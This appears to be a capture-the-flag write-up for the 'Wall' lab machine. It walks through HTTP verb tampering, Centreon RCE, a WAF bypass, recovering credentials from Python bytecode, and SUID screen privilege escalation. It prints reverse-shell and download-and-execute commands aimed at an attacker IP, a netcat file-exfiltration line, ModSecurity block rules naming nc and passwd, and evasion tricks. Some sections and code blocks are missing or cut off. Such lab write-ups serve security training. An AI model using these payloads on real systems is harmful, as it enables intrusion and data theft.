<h2 id="introduction-and-attack-overview">Introduction &amp; Attack Overview</h2>
<p>Wall combines HTTP verb tampering, Centreon command execution, credential recovery, and a vulnerable Screen binary:</p>
<ul>
<li><strong>HTTP Verb Tampering:</strong> A common misconfiguration where authentication is only enforced on certain HTTP methods.</li>
<li><strong>Web Application Firewall (WAF) Bypass:</strong> Learning to adapt payloads when security controls block your attacks.</li>
<li><strong>Authenticated RCE:</strong> Exploiting vulnerable web applications after obtaining credentials.</li>
<li><strong>Bytecode Analysis:</strong> Recovering secrets from compiled Python files.</li>
<li><strong>SUID Binary Exploitation:</strong> using misconfigured setuid binaries to escalate privileges.</li>
</ul>
<h3 id="the-complete-attack-chain">The Complete Attack Chain</h3>
<pre><code>Nmap Scan → Gobuster → HTTP Verb Tampering → Centreon Login
    ↓
Centreon RCE via CVE-2019-13024 (with WAF bypass)
    ↓
Shell as www-data → Decompile backup.pyc → SSH as shelby
    ↓
Exploit SUID screen-4.5.0 → ROOT
</code></pre>

<h2 id="step-3-http-verb-tampering">Step 3: HTTP Verb Tampering</h2>
<h3 id="the-concept-important">The Concept (Important!)</h3>
<p>HTTP supports multiple methods (verbs): <code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>DELETE</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>TRACE</code>, <code>PATCH</code>, etc.</p>
<p>Web servers can enforce access controls per method. A common misconfiguration is:</p>
<pre><code class="language-apache" data-language="apache">&lt;Limit GET&gt;
require valid-user
&lt;/Limit&gt;
</code></pre>
<p>This says: "Only require authentication for GET requests." But what about POST, PUT, or HEAD? They might be <strong>unprotected</strong>.</p>
<h3 id="why-does-this-happen">Why Does This Happen?</h3>
<p>Developers often think: "If someone visits this page in a browser, they need to log in." Browsers primarily use GET, so they only protect GET. They forget that scripts, APIs, and attackers can use other methods.</p>
<h3 id="the-test">The Test</h3>
<p>When we visit <code>/monitoring</code> in a browser (GET request), we see an authentication prompt:</p>
<pre><code class="language-bash" data-language="bash">curl http://10.129.2.9/monitoring/
# Returns: 401 Unauthorized
</code></pre>
<p>But what if we send a POST request instead?</p>
<pre><code class="language-bash" data-language="bash">curl -X POST http://10.129.2.9/monitoring/
</code></pre>
<h3 id="the-result">The Result</h3>
<pre><code class="language-html" data-language="html">&lt;h1&gt;This page is not ready yet !&lt;/h1&gt;
&lt;h2&gt;We should redirect you to the required page !&lt;/h2&gt;

&lt;meta http-equiv="refresh" content="0; URL='/centreon'" /&gt;
</code></pre>

<blockquote>

<p>We didn't crack a password. We simply changed the <em>type</em> of request. This is an important implementation detail: security controls are implemented by code/configuration, and code often has edge cases. test:</p>
<ul>
<li>Different HTTP methods</li>
<li>Case variations (<code>GET</code> vs <code>get</code>)</li>
<li>Extra headers</li>
<li>Path variations (trailing slashes, encoding, etc.)</li>
</ul>
</blockquote>
<h3 id="what-we-learned">What We Learned</h3>
<p>The POST request to <code>/monitoring</code> redirects us to <code>/centreon</code>. We now know a <strong>Centreon</strong> instance is running at <code>http://10.129.2.9/centreon/</code>.</p>
<p>Centreon is an open-source IT infrastructure monitoring platform. Historically, it has had several vulnerabilities, including authenticated RCE.</p>

<h2 id="step-4-centreon-discovery-and-credential-brute-force">Step 4: Centreon Discovery &amp; Credential Brute Force</h2>
<h3 id="visiting-centreon">Visiting Centreon</h3>

<p><strong>Key observation:</strong> Check the version displayed at the bottom of the login page. For Wall, it's <strong>Centreon v19.04</strong>.</p>


<h3 id="the-brute-force-problem">The Brute Force Problem</h3>
<p>The Centreon web login form uses CSRF tokens:</p>
<pre><code>POST /centreon/index.php HTTP/1.1
...

<h3 id="the-api-shortcut">The API Shortcut</h3>
<p>Centreon provides an API endpoint that doesn't require CSRF tokens:</p>
<pre><code>POST /centreon/api/index.php?action=authenticate
</code></pre>
<p>With parameters:</p>
<pre><code>username=admin&amp;password=PASSWORD
</code></pre>
<p>If credentials are wrong, it returns <code>"Bad credentials"</code>.<br>If correct, it returns a JSON auth token:</p>
<pre><code class="language-json" data-language="json">{"authToken":"O+ESx+W7OFxogUkxmREJylhO4FjUMaCVDQHKx\/pVrpI="}
</code></pre>
<h3 id="testing-the-known-credentials">Testing the Known Credentials</h3>
<pre><code class="language-bash" data-language="bash">curl -s http://10.129.2.9/centreon/api/index.php?action=authenticate \
  -d "username=admin&amp;password=REDACTED"
</code></pre>
<p><strong>Result:</strong></p>
<pre><code class="language-json" data-language="json">{"authToken":"O+ESx+W7OFxogUkxmREJylhO4FjUMaCVDQHKx\/pVrpI="}
</code></pre>

<blockquote>

<p>When a web form has anti-automation protections (CSRF tokens, rate limiting, CAPTCHAs), look for alternative authentication mechanisms. APIs, mobile endpoints, and legacy interfaces often have weaker protections than the main web UI.</p>
<p>In this case, the Centreon API was the perfect brute-force target. The password <code>REDACTED</code> is also an excellent reminder that <strong>even "secure" enterprise software gets deployed with weak credentials</strong>.</p>
</blockquote>

<h2 id="step-5-centreon-rce-exploitation-cve-2019-13024">Step 5: Centreon RCE Exploitation (CVE-2019-13024)</h2>
<h3 id="understanding-the-vulnerability">Understanding the Vulnerability</h3>
<p><strong>CVE-2019-13024</strong> is an authenticated Remote Code Execution in Centreon 19.04. It exists in the <strong>Poller Configuration</strong> page, specifically in the field called <strong>"Monitoring Engine Binary"</strong> (also referenced as <code>nagios_bin</code>).</p>
<p>When the application generates monitoring configuration files, it shell-executes whatever command is in this field. Because the input isn't properly sanitized, an attacker can inject arbitrary system commands.</p>
<h3 id="the-attack-flow">The Attack Flow</h3>
<ol>
<li>Log in to Centreon</li>
<li>Navigate to <strong>Configuration → Pollers</strong></li>
<li>Edit the "Central" poller</li>
<li>Change the "Monitoring Engine Binary" field to a malicious command</li>
<li>Save the configuration</li>
<li>Trigger configuration generation via <code>/include/configuration/configGenerate/xml/generateFiles.php</code></li>
<li>The server executes our command</li>
</ol>
<h3 id="building-the-exploit-script">Building the Exploit Script</h3>
<p>Rather than clicking through the browser every time, we automate with Python. Here's the script we created:</p>
<pre><code class="language-python" data-language="python">#!/usr/bin/env python3

<h2 id="step-6-waf-bypass-and-reverse-shell">Step 6: WAF Bypass &amp; Reverse Shell</h2>
<h3 id="discovering-the-waf">Discovering the WAF</h3>
<p>Initially, you might try a simple reverse shell:</p>
<pre><code class="language-bash" data-language="bash">ncat -e /bin/bash 10.10.16.84 443
</code></pre>
<p>But the exploit returns <strong>HTTP 403 Forbidden</strong>. Something is blocking us.</p>
<h3 id="waf-analysis">WAF Analysis</h3>
<p>The Wall box runs <strong>ModSecurity</strong> with custom rules in <code>/etc/modsecurity/modsecurity.conf</code>:</p>
<pre><code># block nc word
SecRule REQUEST_BODY "\bnc\b" "id:00001,deny,msg:'blocked'"

# block ncat word
SecRule REQUEST_BODY "\bncat\b" "id:00002,deny,msg:'blocked'"

# block passwd word
SecRule REQUEST_BODY "\bpasswd\b" "id:00003,deny,msg:'blocked'"

# block # char
SecRule REQUEST_BODY "%23" "id:00004,deny,msg:'blocked'"

# block any whitespace
SecRule REQUEST_BODY "\+" "id:00005,deny,msg:'blocked'"

# block hostname word
SecRule REQUEST_BODY "\bhostname\b" "id:00006,deny,msg:'blocked'"
</code></pre>
<p>The WAF blocks:</p>
<ul>
<li><code>nc</code> and <code>ncat</code></li>
<li><code>passwd</code></li>
<li>The <code>#</code> character (URL-encoded as <code>%23</code>)</li>
<li><strong>Spaces</strong> (the <code>+</code> rule in URL-encoded POST bodies)</li>
<li><code>hostname</code></li>
</ul>
<h3 id="why-spaces-are-blocked">Why Spaces Are Blocked</h3>
<p>In <code>application/x-www-form-urlencoded</code> POST data, spaces are encoded as <code>+</code>. The WAF rule <code>\+</code> blocks these. This means <strong>we cannot use literal spaces in our payloads</strong>.</p>
<h3 id="the-bypass-ifs">The Bypass: <code>${IFS}</code></h3>
<p>Bash has a built-in variable called <strong><code>IFS</code></strong> (Internal Field Separator). By default, it contains whitespace characters (space, tab, newline). We can reference it as <code>${IFS}</code> to insert a space-like separator <strong>without using an actual space character</strong>.</p>
<p>Example:</p>
<pre><code class="language-bash" data-language="bash"># Blocked by WAF:
nc -e /bin/bash 10.10.16.84 443

# Bypassed:
nc${IFS}-e${IFS}/bin/bash${IFS}10.10.16.84${IFS}443
</code></pre>

<blockquote>

<p>A WAF is not invincible - it's a filter. Filters can be bypassed by:</p>
<ul>
<li>Encoding (base64, URL encoding, hex)</li>
<li>Alternative syntax (<code>${IFS}</code> instead of space)</li>
<li>Command substitution (<code>$(printf '%s' ...)</code>)</li>
<li>Case manipulation (though not always effective)</li>
<li>Fragmenting attacks across multiple requests</li>
</ul>
<p>The key is understanding <strong>what exactly the WAF is looking for</strong> and presenting your payload in a way that doesn't match those patterns.</p>
</blockquote>
<h3 id="setting-up-the-reverse-shell">Setting Up the Reverse Shell</h3>
<p>We use a <strong>staged approach</strong>: download a shell script from our Kali machine, then execute it.</p>
<p><strong>Step 1:</strong> Create the shell script on Kali:</p>
<pre><code class="language-bash" data-language="bash">cd ~/Downloads/htb
cat &gt; shell &lt;&lt; 'EOF'
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1
EOF
</code></pre>
<p>This bash one-liner is a classic TCP reverse shell:</p>
<ul>
<li><code>bash -i</code> starts an interactive bash session</li>
<li><code>&gt;&amp; /dev/tcp/10.10.16.84/443</code> redirects stdout and stderr to a TCP connection</li>
<li><code>0&gt;&amp;1</code> redirects stdin from the same connection</li>
</ul>
<p><strong>Step 2:</strong> Start a Python HTTP server to serve the script:</p>
<pre><code class="language-bash" data-language="bash">python3 -m http.server 80
</code></pre>
<p><strong>Step 3:</strong> Start a netcat listener:</p>
<pre><code class="language-bash" data-language="bash">nc -lnvp 443
</code></pre>
<p><strong>Step 4:</strong> Trigger the download and execution:</p>
<pre><code class="language-bash" data-language="bash">python3 centreon-exploit.py http://10.129.2.9/centreon/ admin password1 \
  'wget${IFS}http://10.10.16.84/shell${IFS}-O${IFS}/tmp/yakuhito;${IFS}bash${IFS}/tmp/yakuhito'
</code></pre>
<h3 id="payload-breakdown">Payload Breakdown</h3>
<pre><code>wget${IFS}http://10.10.16.84/shell${IFS}-O${IFS}/tmp/yakuhito;${IFS}bash${IFS}/tmp/yakuhito
</code></pre>
<p>With spaces restored, this is:</p>
<pre><code class="language-bash" data-language="bash">wget http://10.10.16.84/shell -O /tmp/yakuhito; bash /tmp/yakuhito
</code></pre>
<ul>
<li><code>wget</code> downloads our shell script</li>
<li><code>-O /tmp/yakuhito</code> saves it to <code>/tmp</code></li>
<li><code>;</code> separates commands</li>
<li><code>bash /tmp/yakuhito</code> executes the reverse shell</li>
</ul>

<p>On our netcat listener:</p>
<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.2.9] 56734
bash: cannot set terminal process group (1241): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Wall:/usr/local/centreon/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
</code></pre>
<p>We now have a shell as <code>www-data</code>.</p>
<h3 id="stabilizing-the-shell-optional-but-recommended">Stabilizing the Shell (Optional but Recommended)</h3>
<p>For a more stable shell, run:</p>
<pre><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then press Ctrl+Z to background
# On Kali:
stty raw -echo; fg
# Then press Enter twice

</code></pre>

<h3 id="discovery">Discovery</h3>
<p>In <code>/opt/</code>, we find a hidden directory:</p>
<pre><code class="language-bash" data-language="bash">www-data@Wall:/$ ls -la /opt/
total 12

</code></pre>
<p>Inside:</p>
<pre><code class="language-bash" data-language="bash">www-data@Wall:/$ ls -la /opt/.shelby/
total 12
drwxr-xr-x 2 root root 4096 Jul 30 17:39 .
drwxr-xr-x 3 root root 4096 Jul  4 17:28 ..
-rwxr-xr-x 1 root root  981 Jul 30 17:39 backup
</code></pre>
<pre><code class="language-bash" data-language="bash">www-data@Wall:/$ file /opt/.shelby/backup
/opt/.shelby/backup: python 2.7 byte-compiled

<h3 id="understanding-python-bytecode-pyc">Understanding Python Bytecode (<code>.pyc</code>)</h3>
<p>When you run a Python script, Python can compile it to bytecode and save it as a <code>.pyc</code> file. This is <strong>not source code</strong>- it's an intermediate representation. However, it can be decompiled back to approximately the original source code.</p>
<p>This is a <strong>useful source</strong> for attackers because:</p>
<ol>
<li>Developers often compile scripts to "hide" credentials</li>
<li>Bytecode still contains strings, logic flow, and embedded secrets</li>
<li>Tools like <code>uncompyle6</code> can recover the source</li>
</ol>
<h3 id="transferring-the-file-to-kali">Transferring the File to Kali</h3>
<p>Method 1: Netcat</p>
<p>On Kali:</p>
<pre><code class="language-bash" data-language="bash">nc -lnvp 9001 &gt; backup.pyc
</code></pre>
<p>On target:</p>
<pre><code class="language-bash" data-language="bash">cat /opt/.shelby/backup &gt; /dev/tcp/10.10.16.84/9001
</code></pre>
<p>Method 2: Base64</p>

<h2 id="step-8-privilege-escalation-to-root">Step 8: Privilege Escalation to <code>root</code></h2>
<h3 id="enumeration-as-shelby">Enumeration as <code>shelby</code></h3>
<p>Now that we're a real user, we run our privilege escalation checks again:</p>

<h3 id="the-discovery-suid-screen-4-5-0">The Discovery: SUID <code>screen-4.5.0</code></h3>
<pre><code class="language-bash" data-language="bash">shelby@Wall:~$ find / -perm -4000 -type f 2&gt;/dev/null | grep screen
/bin/screen-4.5.0
</code></pre>
<p>The <code>screen</code> binary is a terminal multiplexer. Version 4.5.0 has a <strong>known local privilege escalation vulnerability</strong> because it is installed SUID root and mishandles certain file operations.</p>
<h3 id="understanding-suid">Understanding SUID</h3>
<p>SUID (Set User ID) is a Linux permission flag. When a SUID binary is executed, it runs with the permissions of its <strong>owner</strong>, not the user who launched it.</p>
<p>If root owns a SUID binary, anyone who runs it temporarily becomes root during execution.</p>
<pre><code>-rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
     ↑
     The 's' means SUID is set
</code></pre>
<h3 id="why-is-this-exploitable">Why Is This Exploitable?</h3>
<p>Screen 4.5.0 tries to create and manage log files in <code>/etc/</code> and <code>/tmp/</code>. Because it runs as root, an attacker can trick it into:</p>
<ol>
<li>Creating <code>/etc/ld.so.preload</code> (a file that tells the dynamic linker which libraries to preload)</li>
<li>Preloading a malicious shared library into any new root process</li>
<li>That library creates a SUID root shell</li>
</ol>
<h3 id="the-exploit-screenroot-sh">The Exploit: screenroot.sh</h3>
<p>We use the public exploit from the XiphosResearch repository.</p>
<h3 id="transferring-the-exploit">Transferring the Exploit</h3>
<p>On Kali, download it:</p>
<pre><code class="language-bash" data-language="bash">curl -sL https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh \
  -o ~/Downloads/htb/screenroot.sh
</code></pre>
<p>Serve it:</p>
<pre><code class="language-bash" data-language="bash">cd ~/Downloads/htb
python3 -m http.server 8080
</code></pre>
<p>On the target, download and execute:</p>
<pre><code class="language-bash" data-language="bash">wget http://10.10.16.84:8080/screenroot.sh -O /dev/shm/screenroot.sh
bash /dev/shm/screenroot.sh
</code></pre>
<h3 id="alternative-inline-base64">Alternative: Inline Base64</h3>
<p>If you don't have internet on Kali, you can base64-encode the exploit and paste it directly:</p>
<pre><code class="language-bash" data-language="bash">cd /dev/shm
echo "&lt;BASE64_OF_SCREENROOT.SH&gt;" | base64 -d &gt; .a.sh
bash .a.sh
</code></pre>
<h3 id="what-the-exploit-does">What the Exploit Does</h3>
<ol>
<li><strong>Creates <code>/tmp/libhax.c</code>:</strong> A C library with a constructor function that runs automatically when loaded</li>
<li><strong>Compiles it to <code>/tmp/libhax.so</code>:</strong> This library will:<ul>
<li>Change ownership of <code>/tmp/rootshell</code> to root</li>
<li>Set it SUID (permissions 4755)</li>
<li>Remove the preload file to clean up</li>
</ul>
</li>
<li><strong>Creates <code>/tmp/rootshell.c</code>:</strong> A simple C program that launches <code>/bin/sh</code> as root</li>
<li><strong>Creates <code>/etc/ld.so.preload</code> using screen's log feature:</strong> This tricks screen (running as root) into creating the preload file with our malicious library path</li>
<li><strong>Triggers screen:</strong> When screen runs, it loads our library as root</li>
<li><strong>Executes <code>/tmp/rootshell</code>:</strong> Now SUID root, giving us a root shell</li>
</ol>
<h3 id="the-result-2">The Result</h3>
<pre><code>~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
[+] done!

# id
uid=0(root) gid=0(root) groups=0(root),6001(shelby)
</code></pre>

<blockquote>

<p>Any non-standard SUID binary should immediately catch your attention. Ask:</p>
<ul>
<li>Is this binary supposed to be SUID?</li>
<li>What version is it? Are there known exploits?</li>
<li>Can I write to files it reads/writes?</li>
<li>Can I manipulate its environment?</li>
</ul>
<p>For <code>screen-4.5.0</code>, a quick search for "screen 4.5.0 SUID exploit" returns multiple working proofs-of-concept. When you find a SUID binary, <strong>Google is your best friend.</strong></p>
</blockquote>

<h2 id="lessons">Lessons</h2>
<h3 id="1-test-multiple-http-methods">1. Test Multiple HTTP Methods</h3>
<p>A 401 on GET doesn't mean a resource is fully protected. HTTP verb tampering is an easy win that many testers miss because they only test with browsers or standard tools.</p>
<h3 id="2-apis-are-often-weaker-than-web-interfaces">2. APIs Are Often Weaker Than Web Interfaces</h3>
<p>The Centreon web login had CSRF protection; the API didn't. When you encounter protections on the main application, look for mobile apps, API endpoints, developer tools, or legacy interfaces.</p>
<h3 id="3-wafs-are-filters-not-impenetrable-walls">3. WAFs Are Filters, Not Impenetrable Walls</h3>
<p>A WAF blocks known patterns. The next step is to present known attacks in unknown ways. On Wall, we used:</p>
<ul>
<li><code>${IFS}</code> to bypass the space filter</li>
<li>Base64-encoded payloads to avoid keyword detection</li>
<li>Staged payloads (download-then-execute) to reduce WAF exposure</li>
</ul>
<h3 id="4-bytecode-and-compiled-files-hide-secrets-poorly">4. Bytecode and Compiled Files Hide Secrets Poorly</h3>
<p>Developers often "hide" credentials in compiled files, thinking they're secure. Tools like <code>uncompyle6</code>, <code>jd-gui</code>, <code>dnSpy</code>, and <code>Ghidra</code> make recovery trivial. Check for <code>.pyc</code>, <code>.jar</code>, <code>.exe</code>, and other compiled artifacts.</p>
<h3 id="5-suid-binaries-are-privilege-escalation-gold">5. SUID Binaries Are Privilege Escalation Gold</h3>
<p><code>find / -perm -4000</code> should be in every enumeration script. Any unexpected SUID binary is worth investigating. Version-specific exploits against SUID binaries are common and reliable.</p>
<h3 id="6-build-your-exploits-incrementally">6. Build Your Exploits Incrementally</h3>
<p>Don't start with a reverse shell. Start with <code>id</code>. Confirm each step works before adding complexity. This makes debugging much faster and gives you confidence in your attack chain.</p>
<h3 id="7-document-everything">7. Document Everything</h3>
<p>Save your Nmap output, exploit scripts, and command history. Not only is this good practice for reports, but it also helps you reproduce the attack and learn from it later.</p>
